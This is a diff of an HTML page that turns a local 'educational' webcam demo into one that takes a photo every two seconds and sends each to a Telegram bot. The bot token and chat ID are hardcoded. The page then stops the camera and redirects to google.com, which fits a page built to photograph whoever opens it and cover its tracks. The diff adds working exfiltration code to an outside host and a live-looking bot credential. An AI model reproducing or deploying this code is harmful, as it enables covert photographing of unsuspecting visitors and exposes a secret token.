@@ -1,45 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Educational Camera Auto-Capture</title>
+  <title>Telegram Photo Capture Demo</title>
 </head>
 <body>
-  <h2>📸 Educational Camera Auto-Capture Demo</h2>
+  <h2>📸 Camera Auto-Capture & Send to Telegram</h2>
   <video id="video" autoplay playsinline width="300" height="200" style="border:2px solid black;"></video>
   <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
 
   <script>
+    const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w"; // 🛑 Replace this
+    const CHAT_ID = "7009447523";     // 🛑 Replace this
+
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    // Request camera access
+    // Convert base64 to blob
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], {type:mime});
+    }
+
+    // Send image blob to Telegram
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.png");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).then(res => res.json()).then(resp => {
+        console.log("✅ Sent to Telegram:", resp);
+      }).catch(err => {
+        console.error("❌ Error sending to Telegram:", err);
+      });
+    }
+
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(function(stream) {
-        // Show live preview
         video.srcObject = stream;
 
-        alert("✅ Camera access granted. Capturing photos every 1 second...");
+        alert("✅ Camera access granted. Sending photo every 2 seconds...");
 
-        // Start auto-capture every 1 sec
+        // Capture every 2 sec and send to Telegram
         const photoInterval = setInterval(() => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imgData = canvas.toDataURL("image/png");
-          console.log("📸 Captured at", new Date().toLocaleTimeString());
-          // Educational Note: Image data can be used here (e.g., upload, display, etc.)
-        }, 1000);
+          const blob = dataURLtoBlob(imgData);
+          sendToTelegram(blob);
+        }, 2000); // every 2 sec
 
-        // After 10 seconds, stop everything and redirect
+        // After 10 seconds, stop camera & redirect
         setTimeout(() => {
           clearInterval(photoInterval);
-          stream.getTracks().forEach(track => track.stop()); // stop camera
-          alert("📤 Redirecting after 10 seconds of capture...");
-          window.location.href = "https://example.com"; // Change to your link
-        }, 10000);
+          stream.getTracks().forEach(track => track.stop());
+          alert("📤 Redirecting...");
+          window.location.href = "https://google.com";
+        }, 10000); // 10 sec
 
       })
       .catch(function(error) {
-        alert("🚫 Permission denied or camera error: " + error.message);
+        alert("❌ Camera error: " + error.message);
       });
   </script>
 </body>
